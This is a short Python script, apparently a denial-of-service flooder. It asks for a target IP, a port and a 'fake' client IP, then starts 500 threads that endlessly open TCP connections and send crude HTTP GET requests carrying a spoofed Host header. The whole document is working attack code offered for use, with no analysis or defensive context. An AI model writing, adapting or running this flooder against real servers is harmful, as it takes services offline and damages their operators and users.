import threading
import socket
target = input("server_ip? ")
port = int(input("port? "))
fake_ip = input("client_ip? ")
while True:
    try:
        s_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_test.connect((target, port))
        s_test.close()
        print("Successful connection")
        break
    except (ConnectionRefusedError, socket.gaierror) as e:
        print(e)
        target = input("server_ip? ")
        port = int(input("port? "))


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
